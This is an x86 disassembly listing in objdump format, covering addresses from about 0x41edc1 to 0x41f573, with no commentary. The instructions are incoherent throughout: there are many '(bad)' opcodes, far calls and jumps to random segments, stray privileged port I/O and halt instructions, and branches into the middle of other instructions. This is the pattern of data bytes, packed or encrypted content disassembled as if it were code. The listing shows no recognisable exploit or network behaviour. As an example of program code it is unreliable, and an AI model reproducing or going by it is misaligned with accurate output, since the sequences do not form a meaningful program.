  41edc1:	pop    DWORD PTR ds:0xdb0f64c1
  41edc7:	loop   0x41edc4
  41edc9:	fsub   QWORD PTR [edx]
  41edcb:	cli    
  41edcc:	ret    
  41edcd:	call   0x2e1c:0x88085df
  41edd4:	mul    BYTE PTR [edx+edx*8+0x7d]
  41edd8:	out    dx,al
  41edd9:	nop
  41edda:	xchg   DWORD PTR [eax-0x3f588221],eax
  41ede0:	jge    0x41edb2
  41ede2:	dec    edx
  41ede3:	cwde   
  41ede4:	pop    esi
  41ede5:	mov    cl,0x3c
  41ede7:	xchg   ebp,eax
  41ede8:	dec    edx
  41ede9:	fnsave [eax-0x803551]
  41edef:	jbe    0x41edc4
  41edf1:	mov    esi,0x9ed20af2
  41edf6:	dec    eax
  41edf7:	int3   
  41edf8:	imul   ebx,DWORD PTR [edx+0x31],0x12f5b154
  41edff:	push   es
  41ee00:	es clc 
  41ee02:	push   ebx
  41ee03:	jbe    0x41ee60
  41ee05:	out    0xac,al
  41ee07:	shl    BYTE PTR [ebx-0x47],cl
  41ee0a:	inc    eax
  41ee0b:	mov    eax,cs:0x2837276b
  41ee11:	lea    eax,[ecx+0x68eac04c]
  41ee17:	es popf 
  41ee19:	dec    ebx
  41ee1a:	jle    0x41edfb
  41ee1c:	adc    BYTE PTR [esi+0x73],dh
  41ee1f:	leave  
  41ee20:	add    DWORD PTR [edx+0x72139cce],esp
  41ee26:	call   DWORD PTR [ecx]
  41ee28:	mov    ds:0x7614443,eax
  41ee2d:	call   0xdfea:0xefe81ecf
  41ee34:	sub    DWORD PTR [ebx],ecx
  41ee36:	or     al,0xe3
  41ee38:	and    bl,BYTE PTR [esi+0x6520e607]
  41ee3e:	cwde   
  41ee3f:	xor    DWORD PTR [eax],0xffffffd0
  41ee42:	push   ss
  41ee43:	sbb    eax,0xac95c9d4
  41ee48:	daa    
  41ee49:	sub    BYTE PTR [ecx-0x7aa8b154],ah
  41ee4f:	stos   DWORD PTR es:[edi],eax
  41ee50:	push   ebp
  41ee51:	cs mov ebx,0x5ae66435
  41ee57:	scas   al,BYTE PTR es:[edi]
  41ee58:	(bad)  
  41ee59:	sbb    eax,0x6bfa98a
  41ee5e:	and    eax,0x2ac88e40
  41ee63:	enter  0xc793,0xa0
  41ee67:	inc    edi
  41ee68:	(bad)  [edi]
  41ee6a:	lea    ecx,[esi-0x72]
  41ee6d:	fwait
  41ee6e:	jns    0x41ee84
  41ee70:	dec    ebx
  41ee71:	imul   ebx,DWORD PTR [ebx+0x519a11e9],0xbeba86ee
  41ee7b:	(bad)  
  41ee7c:	jns    0x41eeae
  41ee7e:	cmp    BYTE PTR [edi+ecx*1],0x5c
  41ee82:	sbb    BYTE PTR [edx-0x29],0x1b
  41ee86:	ja     0x41ee9e
  41ee88:	pop    eax
  41ee89:	inc    edi
  41ee8a:	xchg   edi,eax
  41ee8b:	or     BYTE PTR [ebx*1-0x5fb9c703],bl
  41ee92:	jmp    0x41ee30
  41ee94:	inc    ebp
  41ee95:	js     0x41eeb2
  41ee97:	lock mov DWORD PTR [ebx+0x24],0x31fd8774
  41ee9f:	add    DWORD PTR [edx-0x3e],esi
  41eea2:	arpl   si,bp
  41eea4:	mov    edi,0xccda51b9
  41eea9:	test   BYTE PTR [ebx+0x5d],0xba
  41eead:	sbb    eax,0x696b1934
  41eeb2:	imul   esp,ebx,0xf4cfceec
  41eeb8:	or     eax,DWORD PTR [eax+0x75]
  41eebb:	(bad)  
  41eebc:	sub    bl,dh
  41eebe:	aam    0xa4
  41eec0:	sub    eax,0xf78d4ae3
  41eec5:	add    BYTE PTR [ebx-0x79ba2c1b],dh
  41eecb:	mov    cl,0xca
  41eecd:	pop    ecx
  41eece:	jne    0x41ee58
  41eed0:	dec    ecx
  41eed1:	das    
  41eed2:	cmp    dh,BYTE PTR ds:0x104fd785
  41eed8:	mov    al,0xb4
  41eeda:	es fwait
  41eedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eedd:	mov    eax,0x14bce670
  41eee2:	cmp    ebx,DWORD PTR [ebx+ebp*1-0x1fe767f]
  41eee9:	xchg   ebp,eax
  41eeea:	pop    ds
  41eeeb:	fld    QWORD PTR [ebp+0x24204ee1]
  41eef1:	xor    eax,0x7bf454c2
  41eef6:	jl     0x41ef4b
  41eef8:	sub    ebx,DWORD PTR [edi-0x4b]
  41eefb:	push   esp
  41eefc:	sar    DWORD PTR [ebx-0x6e],cl
  41eeff:	xchg   esp,eax
  41ef00:	mov    ss,WORD PTR [edi+edx*8]
  41ef03:	lea    esi,[eax]
  41ef05:	push   edi
  41ef06:	mov    al,ds:0x49e04c85
  41ef0b:	scas   al,BYTE PTR es:[edi]
  41ef0c:	icebp  
  41ef0d:	push   cs
  41ef0e:	retf   0xc782
  41ef11:	lods   al,BYTE PTR ds:[esi]
  41ef12:	push   edx
  41ef13:	pop    ebp
  41ef14:	icebp  
  41ef15:	cmp    DWORD PTR [esi+0x53a8443b],0x62ca96e7
  41ef1f:	xchg   ecx,eax
  41ef20:	pusha  
  41ef21:	ret    0x3298
  41ef24:	inc    eax
  41ef25:	cwde   
  41ef26:	adc    BYTE PTR [esp+eax*8],cl
  41ef29:	xchg   BYTE PTR [eax-0x6b03cac9],dh
  41ef2f:	jle    0x41efaf
  41ef31:	cmc    
  41ef32:	dec    esi
  41ef33:	popf   
  41ef34:	bound  eax,QWORD PTR [edx-0x14]
  41ef37:	xchg   ebp,eax
  41ef38:	mov    cl,0x52
  41ef3a:	pop    ebx
  41ef3b:	cmp    al,0xd0
  41ef3d:	into   
  41ef3e:	cmp    DWORD PTR [ecx],esp
  41ef40:	test   DWORD PTR ds:[edx+ecx*4+0x175fda48],esp
  41ef48:	pop    ss
  41ef49:	test   al,0xe3
  41ef4b:	mov    dl,ah
  41ef4d:	dec    bh
  41ef4f:	pushf  
  41ef50:	jp     0x41eefd
  41ef52:	cmp    BYTE PTR [edi+0x78092bf3],0x2c
  41ef59:	push   ss
  41ef5a:	rcr    ecx,0x88
  41ef5d:	inc    esi
  41ef5e:	lock (bad) 
  41ef60:	dec    esi
  41ef61:	jmp    0xa468:0xb159dadd
  41ef68:	dec    ebx
  41ef69:	(bad)  
  41ef6a:	mov    bh,BYTE PTR [eax+0x710b64aa]
  41ef70:	push   cs
  41ef71:	push   ebx
  41ef72:	aam    0x7
  41ef74:	xlat   BYTE PTR ds:[ebx]
  41ef75:	imul   eax,DWORD PTR ds:0xfce2d70c,0x892a20e1
  41ef7f:	fs sahf 
  41ef81:	retf   
  41ef82:	xor    DWORD PTR [ebx-0x47],esp
  41ef85:	cs int 0x35
  41ef88:	ds popf 
  41ef8a:	pop    ebp
  41ef8b:	in     eax,dx
  41ef8c:	adc    al,0x8c
  41ef8e:	jmp    0x41ef62
  41ef90:	xchg   edi,eax
  41ef91:	fwait
  41ef92:	ds pop edi
  41ef94:	fwait
  41ef95:	inc    eax
  41ef96:	inc    edx
  41ef97:	xor    BYTE PTR [ecx],dl
  41ef99:	inc    ebp
  41ef9a:	mov    DWORD PTR [eax],0x274578ff
  41efa0:	fisub  WORD PTR [eax-0x1235493a]
  41efa6:	jle    0x41ef63
  41efa8:	push   edx
  41efa9:	bound  ebx,QWORD PTR [ebx+0x45821c3]
  41efaf:	mov    al,0x49
  41efb1:	jno    0x41ef58
  41efb3:	cs sub esi,eax
  41efb6:	jmp    0x41f027
  41efb8:	cmp    ebp,esi
  41efba:	sti    
  41efbb:	and    eax,0xb5be0eda
  41efc0:	fs xor al,0x20
  41efc3:	out    0x14,eax
  41efc5:	gs pusha 
  41efc7:	mov    esp,0xbbca5329
  41efcc:	xchg   ebx,eax
  41efcd:	les    ebx,FWORD PTR [edi+0x599849d0]
  41efd3:	dec    ebp
  41efd4:	mov    al,0x68
  41efd6:	adc    DWORD PTR [eax-0x64],0xffffff97
  41efda:	jnp    0x41f030
  41efdc:	cdq    
  41efdd:	fsub   DWORD PTR [eax-0x39]
  41efe0:	inc    edx
  41efe1:	xchg   edi,eax
  41efe2:	int    0x88
  41efe4:	inc    esi
  41efe5:	hlt    
  41efe6:	cmc    
  41efe7:	push   ebx
  41efe8:	add    DWORD PTR ds:[ebx],ebx
  41efeb:	sub    DWORD PTR [ecx+0x68a3b0ca],edi
  41eff1:	adc    DWORD PTR [edx-0x368b224b],edi
  41eff7:	dec    ecx
  41eff8:	fadd   DWORD PTR [eax]
  41effa:	cwde   
  41effb:	out    0x1,eax
  41effd:	in     al,dx
  41effe:	jecxz  0x41f07e
  41f000:	aam    0x1b
  41f002:	jp     0x41eff4
  41f004:	push   es
  41f005:	sbb    dh,BYTE PTR [ecx-0x61]
  41f008:	or     eax,0xf3a3e726
  41f00d:	push   ecx
  41f00e:	xor    al,0x35
  41f010:	(bad)  
  41f011:	cmp    DWORD PTR [edi+0x43800cc5],esi
  41f017:	inc    edx
  41f018:	mov    ah,0x88
  41f01a:	sbb    eax,0xbb3f8079
  41f01f:	xor    al,0x1b
  41f021:	aas    
  41f022:	xor    eax,0x154b9eb3
  41f027:	lods   al,BYTE PTR ds:[esi]
  41f028:	mov    eax,ds:0x17c6cbc3
  41f02d:	in     eax,0x9d
  41f02f:	push   DWORD PTR [ebx]
  41f031:	ja     0x41f085
  41f033:	inc    esp
  41f034:	out    dx,eax
  41f035:	cli    
  41f036:	inc    ebp
  41f037:	sub    al,0x13
  41f039:	jmp    0x41efe9
  41f03b:	stc    
  41f03c:	test   al,0xb9
  41f03e:	test   eax,0x9e0fa4cb
  41f043:	scas   eax,DWORD PTR es:[edi]
  41f044:	je     0x41eff5
  41f046:	outs   dx,DWORD PTR ds:[esi]
  41f047:	xor    eax,0xeafd43d4
  41f04c:	fs lahf 
  41f04e:	imul   edx,DWORD PTR [edx-0x5d],0x18
  41f052:	shl    DWORD PTR [ebx+0xc09fd1c],0x78
  41f059:	adc    eax,0xeca3c5ba
  41f05e:	cmp    DWORD PTR [edi],ecx
  41f060:	xchg   edx,ebp
  41f062:	or     bl,BYTE PTR [esi-0x41a7d08d]
  41f068:	ss mov al,0xff
  41f06b:	xchg   esi,eax
  41f06c:	xor    al,0xeb
  41f06e:	mov    al,bh
  41f070:	loop   0x41f08c
  41f072:	jmp    0xe3377efb
  41f077:	jns    0x41f024
  41f079:	lds    eax,FWORD PTR [edi-0x5b116102]
  41f07f:	push   0x169df68b
  41f084:	inc    ebp
  41f085:	out    0xf0,al
  41f087:	call   0xc504:0x32c1e196
  41f08e:	xor    eax,0x60047371
  41f093:	and    eax,0x7b00bd93
  41f098:	ds js  0x41f04f
  41f09b:	mov    al,0x59
  41f09d:	mov    al,ds:0x3b823d22
  41f0a2:	ret    
  41f0a3:	jmp    0x41f064
  41f0a5:	or     eax,0x83a76fd5
  41f0aa:	mov    dl,0x39
  41f0ac:	dec    bx
  41f0ae:	mov    al,bl
  41f0b0:	add    BYTE PTR [edx-0x55],0x61
  41f0b4:	movnti DWORD PTR [edi+ebx*4-0x2a4bdd99],ebp
  41f0bc:	dec    esi
  41f0bd:	adc    ecx,edi
  41f0bf:	sbb    ecx,edi
  41f0c1:	push   ebx
  41f0c2:	jmp    0xe80b:0x9abc656b
  41f0c9:	out    dx,eax
  41f0ca:	mov    ecx,0xbe91eb15
  41f0cf:	push   es
  41f0d0:	int3   
  41f0d1:	xchg   BYTE PTR [esi-0x74],ah
  41f0d4:	pop    ebp
  41f0d5:	dec    BYTE PTR [eax+0x27a65808]
  41f0db:	mov    esi,0xd2c01e06
  41f0e0:	xchg   esi,eax
  41f0e1:	mov    esp,0xcb6e33d5
  41f0e6:	inc    edx
  41f0e7:	xchg   esp,eax
  41f0e8:	pop    ss
  41f0e9:	mov    cl,0xca
  41f0eb:	sub    BYTE PTR [edx+0x423cb665],bl
  41f0f1:	and    ch,al
  41f0f3:	jns    0x41f136
  41f0f5:	sti    
  41f0f6:	and    al,0x79
  41f0f8:	data16 das 
  41f0fa:	sub    al,0x5
  41f0fc:	mov    ds:0x9c073a50,eax
  41f101:	imul   BYTE PTR [ebx+0x1755ff00]
  41f107:	retf   
  41f108:	shl    BYTE PTR [ebx+eax*8+0x28],0x61
  41f10d:	and    eax,0x3d3c11a8
  41f112:	mov    ds:0x5c6f90c6,al
  41f117:	add    bl,bl
  41f119:	xchg   BYTE PTR [eax+0x26],dl
  41f11c:	test   dh,cl
  41f11e:	xchg   ecx,eax
  41f11f:	stos   BYTE PTR es:[edi],al
  41f120:	jmp    0x709f:0x10affcd3
  41f127:	add    al,0xed
  41f129:	enter  0x294a,0xf4
  41f12d:	mov    eax,DWORD PTR [ebx+0x247b3667]
  41f133:	mov    ebx,0xd0c7d39b
  41f138:	xor    BYTE PTR [eax+0x9],0xa4
  41f13c:	ret    
  41f13d:	and    al,BYTE PTR [edx+ecx*4-0x6fd621f8]
  41f144:	pushf  
  41f145:	adc    ecx,eax
  41f147:	pop    ss
  41f148:	mov    dh,0x9
  41f14a:	dec    esp
  41f14b:	jbe    0x41f1a3
  41f14d:	or     DWORD PTR [di+0x63ac],ebx
  41f152:	push   edx
  41f153:	xchg   BYTE PTR [eax-0x55],dl
  41f156:	loop   0x41f0f6
  41f158:	mov    bl,0x9f
  41f15a:	aas    
  41f15b:	mov    al,ds:0x7dfe531b
  41f160:	inc    esp
  41f161:	call   0xa8cc0611
  41f166:	loop   0x41f1a3
  41f168:	add    eax,DWORD PTR [edx-0x42]
  41f16b:	mov    esi,0x7343035
  41f170:	or     eax,0x6f2a01f0
  41f175:	inc    ecx
  41f176:	sub    edx,DWORD PTR [eax]
  41f178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f179:	push   esp
  41f17a:	fiadd  WORD PTR [edi]
  41f17c:	xor    DWORD PTR [eax],eax
  41f17e:	pop    eax
  41f17f:	in     al,dx
  41f180:	pop    ss
  41f181:	mov    ecx,0xf0f382c2
  41f186:	mov    esp,0xabcdc299
  41f18b:	and    esp,DWORD PTR [esi+0x7b]
  41f18e:	out    0xa7,eax
  41f190:	leave  
  41f191:	adc    dl,BYTE PTR [esi+eiz*2]
  41f194:	retf   0x5c7e
  41f197:	(bad)  
  41f199:	nop
  41f19a:	and    BYTE PTR [esi+0x33fc2c93],al
  41f1a0:	stos   DWORD PTR es:[edi],eax
  41f1a1:	mov    edx,0x96437a34
  41f1a6:	push   ebx
  41f1a7:	js     0x41f145
  41f1a9:	sub    dh,BYTE PTR [ecx+0x5f]
  41f1ac:	(bad)  
  41f1ad:	aam    0x21
  41f1af:	test   eax,0xb8ea2baa
  41f1b4:	sbb    eax,0xfc463ae0
  41f1b9:	and    eax,0x779401ce
  41f1be:	out    dx,eax
  41f1bf:	aaa    
  41f1c0:	jno    0x41f20f
  41f1c2:	cmp    DWORD PTR [ebx-0x2401cfec],ebp
  41f1c8:	mov    ah,0xbf
  41f1ca:	push   ds
  41f1cb:	in     eax,0xfa
  41f1cd:	jecxz  0x41f184
  41f1cf:	sbb    DWORD PTR ds:0x5a0f8c35,esp
  41f1d5:	cmp    DWORD PTR [ebp-0x71],0xffffffcf
  41f1d9:	xchg   esi,eax
  41f1da:	and    esi,DWORD PTR [eax-0x413e49a3]
  41f1e0:	jns    0x41f1e9
  41f1e2:	add    BYTE PTR ds:0x22be3f8,dl
  41f1e8:	ins    BYTE PTR es:[edi],dx
  41f1e9:	cmp    bh,cl
  41f1eb:	jmp    0x559a:0xe8808b00
  41f1f2:	push   0x4203a418
  41f1f7:	dec    esi
  41f1f8:	mov    ecx,0xbb508b96
  41f1fd:	pop    ebp
  41f1fe:	pop    ecx
  41f1ff:	dec    ecx
  41f200:	jge    0x41f196
  41f202:	jns    0x41f207
  41f204:	mov    ecx,0xaf47eaba
  41f209:	push   ss
  41f20a:	sbb    DWORD PTR [edi-0x7b],ecx
  41f20d:	pop    ecx
  41f20e:	call   0x61a0:0xf21b4f9
  41f215:	jnp    0x41f1fb
  41f217:	add    BYTE PTR [esi+0xb47d69],al
  41f21d:	and    eax,0xc2ff383c
  41f222:	lods   eax,DWORD PTR ds:[esi]
  41f223:	xor    cl,BYTE PTR [ecx-0x72138192]
  41f229:	xor    al,0xe6
  41f22b:	aas    
  41f22c:	and    edi,edx
  41f22e:	aaa    
  41f22f:	add    eax,0x8cd45baa
  41f234:	pop    esp
  41f235:	retf   
  41f236:	aas    
  41f237:	fisttp QWORD PTR [ecx+ebx*2]
  41f23a:	dec    ebx
  41f23b:	or     bl,ch
  41f23d:	into   
  41f23e:	nop
  41f23f:	out    0xfa,al
  41f241:	mov    edx,0x7d64ec05
  41f246:	aam    0x84
  41f248:	inc    esi
  41f249:	xor    al,0x93
  41f24b:	loope  0x41f1d9
  41f24d:	daa    
  41f24e:	in     al,0x9c
  41f250:	loopne 0x41f29a
  41f252:	inc    ebx
  41f253:	jmp    0x41f1dd
  41f255:	and    eax,0xa2bf2b4a
  41f25a:	test   al,0x1a
  41f25c:	cdq    
  41f25d:	mov    esi,0x5388d8d3
  41f262:	ins    DWORD PTR es:[edi],dx
  41f263:	fstp   TBYTE PTR ds:0xdedea95f
  41f269:	jbe    0x41f2aa
  41f26b:	outs   dx,BYTE PTR ds:[esi]
  41f26c:	sti    
  41f26d:	inc    ecx
  41f26e:	fwait
  41f26f:	bound  edx,QWORD PTR [ecx]
  41f271:	in     al,dx
  41f272:	rcr    BYTE PTR gs:[edx-0xb],cl
  41f276:	jecxz  0x41f20b
  41f278:	ins    BYTE PTR es:[edi],dx
  41f279:	xchg   ebp,eax
  41f27a:	repz mov ds:0xa1d1aee7,al
  41f280:	icebp  
  41f281:	mov    bl,0xc6
  41f283:	jo     0x41f275
  41f285:	fnstsw WORD PTR [eax]
  41f287:	jno    0x41f2a1
  41f289:	sub    al,0x6
  41f28b:	int    0x20
  41f28d:	hlt    
  41f28e:	mov    dh,BYTE PTR [esi]
  41f290:	mov    esp,esp
  41f292:	aaa    
  41f293:	and    DWORD PTR [ebp+0x4f],esp
  41f296:	mov    bl,0xc9
  41f298:	xchg   edi,eax
  41f299:	scas   al,BYTE PTR es:[edi]
  41f29a:	mov    ebp,0xf7ad02be
  41f29f:	mov    ebx,0x357fc3d2
  41f2a4:	bound  esp,QWORD PTR [ecx-0x437a030]
  41f2aa:	call   0x897:0x108ba948
  41f2b1:	cmc    
  41f2b2:	inc    eax
  41f2b3:	aad    0x54
  41f2b5:	inc    edx
  41f2b6:	and    esp,DWORD PTR [ecx+ebp*8]
  41f2b9:	dec    esp
  41f2ba:	mov    esi,0xbe67d17a
  41f2bf:	cmp    esp,ecx
  41f2c1:	push   esp
  41f2c2:	int3   
  41f2c3:	in     al,dx
  41f2c4:	popa   
  41f2c5:	fwait
  41f2c6:	mov    bl,dl
  41f2c8:	sub    DWORD PTR [edi+eiz*2],0xffffffd7
  41f2cc:	loopne 0x41f2b7
  41f2ce:	lods   al,BYTE PTR ds:[esi]
  41f2cf:	pop    esi
  41f2d0:	mov    al,ds:0xff357743
  41f2d5:	std    
  41f2d6:	or     cl,BYTE PTR [ecx+0x7230b8a0]
  41f2dc:	inc    edx
  41f2dd:	jns    0x41f283
  41f2df:	outs   dx,BYTE PTR ds:[esi]
  41f2e0:	adc    DWORD PTR [edx],ebp
  41f2e2:	push   esi
  41f2e3:	mul    dl
  41f2e5:	pop    ds
  41f2e6:	jae    0x41f335
  41f2e8:	retf   0xcc33
  41f2eb:	mov    gs,WORD PTR [esi+ebp*4]
  41f2ee:	out    0xad,al
  41f2f0:	shl    DWORD PTR [esp+edi*1-0x5255dd09],1
  41f2f7:	out    dx,al
  41f2f8:	add    al,0x3f
  41f2fa:	lock jl 0x41f297
  41f2fd:	push   ebp
  41f2fe:	inc    edx
  41f2ff:	daa    
  41f300:	jmp    0x41f344
  41f302:	aam    0x94
  41f304:	mov    cs,ebx
  41f306:	fstp   QWORD PTR [esi+eax*8+0x67f4fcd9]
  41f30d:	mov    al,ds:0xfc8f0108
  41f312:	js     0x41f2fc
  41f314:	fimul  DWORD PTR [edi]
  41f316:	xor    ch,BYTE PTR [edx+0x50]
  41f319:	inc    ecx
  41f31a:	icebp  
  41f31b:	sub    al,0xb9
  41f31d:	xor    dl,al
  41f31f:	adc    esi,ebx
  41f321:	xchg   edi,eax
  41f322:	loope  0x41f2c6
  41f324:	ins    BYTE PTR es:[edi],dx
  41f325:	les    edi,FWORD PTR [esi-0x6b95cdf6]
  41f32b:	les    eax,FWORD PTR [edx-0x59]
  41f32e:	in     al,0xbe
  41f330:	xchg   ebx,eax
  41f331:	stos   BYTE PTR es:[edi],al
  41f332:	loope  0x41f38f
  41f334:	rcr    cl,0xc7
  41f337:	mov    ah,0xfa
  41f339:	(bad)  
  41f33a:	jmp    0x41f33c
  41f33c:	inc    ecx
  41f33d:	mov    esi,0xb34d4ade
  41f342:	ror    BYTE PTR [edx+esi*8],cl
  41f345:	pop    ebp
  41f346:	mov    al,0x1c
  41f348:	adc    BYTE PTR [ebx-0x34],bh
  41f34b:	cmp    al,0x44
  41f34d:	sub    edi,DWORD PTR [eax-0x5b0c569]
  41f353:	jb     0x41f2e2
  41f355:	je     0x41f349
  41f357:	mov    edx,0x8b36b5b
  41f35c:	lods   al,BYTE PTR ds:[esi]
  41f35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f35e:	pop    edx
  41f35f:	inc    esi
  41f360:	xchg   edi,eax
  41f361:	pop    esp
  41f362:	cmp    DWORD PTR [edi+ecx*8-0x77],esi
  41f366:	mov    ds:0xfb3e4a03,al
  41f36b:	push   edx
  41f36c:	sbb    dl,BYTE PTR [edi]
  41f36e:	adc    BYTE PTR ds:0xc591cfe4,ch
  41f374:	xchg   ecx,eax
  41f375:	push   ebx
  41f376:	or     al,0xdb
  41f378:	or     DWORD PTR [ebp+edx*8-0x224f0322],0x1a
  41f380:	int3   
  41f381:	nop
  41f382:	or     BYTE PTR [eax-0x26],dl
  41f385:	rol    DWORD PTR [edx+0x2308fbd9],0xb8
  41f38c:	lods   al,BYTE PTR ds:[esi]
  41f38d:	inc    edi
  41f38e:	stos   DWORD PTR es:[edi],eax
  41f38f:	arpl   WORD PTR [eax+0x94d25e5],bx
  41f395:	pop    eax
  41f396:	jnp    0x41f354
  41f398:	xchg   edx,eax
  41f399:	hlt    
  41f39a:	sub    cl,BYTE PTR [ecx-0x28db6427]
  41f3a0:	or     bh,BYTE PTR [eax-0x7c056c16]
  41f3a6:	pop    ebp
  41f3a7:	out    dx,al
  41f3a8:	lea    ebp,[edx-0x50c3a9ce]
  41f3ae:	add    eax,0x6ab9aa1c
  41f3b3:	data16 sti 
  41f3b5:	or     BYTE PTR ds:0x78c55fcc,dh
  41f3bb:	fmul   DWORD PTR [ebx]
  41f3bd:	or     BYTE PTR [eax],bh
  41f3bf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f3c1:	add    edi,0x20
  41f3c4:	dec    ecx
  41f3c5:	ds push es
  41f3c7:	loopne 0x41f3af
  41f3c9:	or     edi,DWORD PTR [ebx]
  41f3cb:	mov    ah,0x8f
  41f3cd:	outs   dx,BYTE PTR ds:[esi]
  41f3ce:	stos   BYTE PTR es:[edi],al
  41f3cf:	outs   dx,DWORD PTR ds:[esi]
  41f3d0:	sbb    DWORD PTR [ecx],esp
  41f3d2:	xor    al,0x6a
  41f3d4:	call   0xde9d6934
  41f3d9:	mov    fs,WORD PTR [ebp-0x32]
  41f3dc:	rol    esp,cl
  41f3de:	push   ecx
  41f3df:	mov    ax,ds:0x83141299
  41f3e5:	mov    bh,0x15
  41f3e7:	sub    eax,0x92837947
  41f3ec:	sbb    ah,BYTE PTR [esi+0x29]
  41f3ef:	ins    DWORD PTR es:[edi],dx
  41f3f0:	mov    edi,0x31b1e35f
  41f3f5:	lods   al,BYTE PTR ds:[esi]
  41f3f6:	in     eax,0xdf
  41f3f8:	cwde   
  41f3f9:	cmc    
  41f3fa:	xchg   esi,eax
  41f3fb:	call   0x94f4b717
  41f400:	mov    ah,0x7b
  41f402:	cmp    eax,0x4a5df7e9
  41f407:	push   esi
  41f408:	out    dx,eax
  41f409:	addr16 cmp al,0xa
  41f40c:	or     al,0x48
  41f40e:	xlat   BYTE PTR ds:[ebx]
  41f40f:	call   0x2a9cc38c
  41f414:	cmp    BYTE PTR [ecx+0x4c6c122e],dh
  41f41a:	mov    ecx,0xe52e5523
  41f41f:	pop    ebx
  41f420:	pop    esp
  41f421:	aad    0x8d
  41f423:	dec    eax
  41f424:	cmp    bh,BYTE PTR [eax-0x77]
  41f427:	xor    al,0xae
  41f429:	mov    al,ds:0xaad82469
  41f42e:	xchg   ebp,eax
  41f42f:	sar    DWORD PTR [ecx],1
  41f431:	sub    al,0x46
  41f433:	pop    ebx
  41f434:	sub    bh,ch
  41f436:	int    0xf8
  41f438:	cwde   
  41f439:	push   es
  41f43a:	sbb    esi,ecx
  41f43c:	clc    
  41f43d:	pop    ss
  41f43e:	test   DWORD PTR [eax+0x33],edx
  41f441:	push   edx
  41f442:	nop
  41f443:	mov    esp,0xe7a568fc
  41f448:	sbb    DWORD PTR [edx-0x72],eax
  41f44b:	xchg   DWORD PTR [eax-0x36],esp
  41f44e:	inc    ebx
  41f44f:	pop    ebp
  41f450:	mov    edx,0x6fac78e2
  41f455:	leave  
  41f456:	int3   
  41f457:	rcr    BYTE PTR [ecx+ebx*4-0x7ebd6fd4],1
  41f45e:	or     eax,0xd865d7f2
  41f463:	dec    esp
  41f464:	jl     0x41f4b8
  41f466:	mov    ds:0x5bc78d54,eax
  41f46b:	mul    DWORD PTR [esi-0x302f8dd8]
  41f471:	dec    ebx
  41f472:	jge    0x41f434
  41f474:	and    ebp,DWORD PTR [esi]
  41f476:	pusha  
  41f477:	int    0x96
  41f479:	das    
  41f47a:	mov    dh,0xe4
  41f47c:	inc    edi
  41f47d:	pop    es
  41f47e:	dec    eax
  41f47f:	nop
  41f480:	xor    DWORD PTR [eax+0xf],ecx
  41f483:	mul    cl
  41f485:	jg     0x41f410
  41f487:	jmp    0xb5b57efe
  41f48c:	pop    ecx
  41f48d:	push   esp
  41f48e:	mov    al,ds:0x161dc533
  41f493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f494:	xor    ch,BYTE PTR [ecx+0x3]
  41f497:	pop    ss
  41f498:	sbb    BYTE PTR [esp+esi*1-0x460cd8f2],al
  41f49f:	repnz popa 
  41f4a1:	ds push edx
  41f4a3:	cs ds dec eax
  41f4a6:	sub    ebx,DWORD PTR [ebx+0x33]
  41f4a9:	data16 mov cl,0xa8
  41f4ac:	jbe    0x41f461
  41f4ae:	push   eax
  41f4af:	mov    ebp,0x40e6b6e7
  41f4b4:	outs   dx,DWORD PTR ds:[esi]
  41f4b5:	fld    st(3)
  41f4b7:	mov    cl,0x54
  41f4b9:	pop    ebx
  41f4ba:	int3   
  41f4bb:	sbb    al,BYTE PTR [esi-0x64]
  41f4be:	jp     0x41f48a
  41f4c0:	pop    eax
  41f4c1:	pushf  
  41f4c2:	imul   BYTE PTR [ecx+0x1d]
  41f4c5:	pop    eax
  41f4c6:	int3   
  41f4c7:	scas   al,BYTE PTR es:[edi]
  41f4c8:	inc    edx
  41f4c9:	jg     0x41f506
  41f4cb:	jl     0x41f517
  41f4cd:	xlat   BYTE PTR ds:[ebx]
  41f4ce:	push   edi
  41f4cf:	out    0x34,eax
  41f4d1:	fiadd  DWORD PTR [edi]
  41f4d3:	or     DWORD PTR [ebx-0x4e],0xffffffb0
  41f4d7:	cmp    al,0xff
  41f4d9:	sbb    cl,BYTE PTR [ecx-0x75]
  41f4dc:	push   0x31
  41f4de:	cld    
  41f4df:	sub    dh,ch
  41f4e1:	adc    al,0xa6
  41f4e3:	lahf   
  41f4e4:	jae    0x41f4f7
  41f4e6:	sub    cl,BYTE PTR ds:0x736c9d48
  41f4ec:	mov    esp,DWORD PTR [esi]
  41f4ee:	mov    dl,dh
  41f4f0:	jb     0x41f52e
  41f4f2:	push   esp
  41f4f3:	mov    al,ds:0xbb984167
  41f4f8:	xor    al,0xd0
  41f4fa:	and    al,0xce
  41f4fc:	fsubr  QWORD PTR [edi]
  41f4fe:	mov    BYTE PTR [edi+0x7b657482],dl
  41f504:	inc    eax
  41f505:	and    dh,BYTE PTR [edi-0x21907f1c]
  41f50b:	dec    ebx
  41f50c:	icebp  
  41f50d:	cs push edx
  41f50f:	in     al,dx
  41f510:	and    eax,0x28a8748
  41f515:	push   eax
  41f516:	cmovnp ebp,DWORD PTR [edx+0x78]
  41f51a:	xor    cl,dl
  41f51c:	sub    bl,BYTE PTR ds:0x2404a256
  41f522:	mov    ebx,0xe26c2fc6
  41f527:	adc    ebp,ebp
  41f529:	enter  0x4a43,0x2
  41f52d:	pop    esp
  41f52e:	mov    ds:0xb58b8fa5,al
  41f533:	dec    eax
  41f534:	jne    0x41f4de
  41f536:	ret    
  41f537:	sar    DWORD PTR [esi],cl
  41f539:	out    dx,eax
  41f53a:	add    BYTE PTR [edi-0x62390841],bh
  41f540:	mov    gs,WORD PTR [esi]
  41f542:	test   DWORD PTR [edi-0x9],0xd846547b
  41f549:	cmp    al,0x89
  41f54b:	xor    DWORD PTR [edi+esi*1],ebx
  41f54e:	mov    edx,0xa8fa9f98
  41f553:	bound  edi,QWORD PTR [ebx]
  41f555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f556:	xor    ebp,DWORD PTR [ecx-0x616272eb]
  41f55c:	xor    dl,BYTE PTR [edx+0x3a]
  41f55f:	inc    BYTE PTR [edi+eiz*8]
  41f562:	scas   eax,DWORD PTR es:[edi]
  41f563:	add    ebx,ebx
  41f565:	cmc    
  41f566:	add    eax,0x864705f5
  41f56b:	mov    edx,ecx
  41f56d:	push   ss
  41f56e:	mov    ebx,0x38b0a20
  41f573:	inc    ebx
